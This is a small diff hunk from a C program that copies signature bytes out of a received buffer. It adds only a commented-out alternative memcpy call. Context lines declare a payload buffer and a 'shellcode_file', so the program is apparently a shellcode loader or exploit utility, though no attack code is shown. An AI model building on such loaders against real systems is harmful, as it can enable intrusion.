@@ -216,6 +216,8 @@ int main(int argc, char* argv[])
 	memcpy(signature[6], (int*)&recvbuff + 23, 1);
 	memcpy(signature[7], (int*)&recvbuff + 24, 1);
 	memcpy(signature[8], (int*)&recvbuff + 25, 1);
+	//OR
+	//memcpy(signature, (int*)&recvbuff + 18, 8);
 
 	BUFFER_WITH_SIZE payload;
 	LPCSTR shellcode_file;
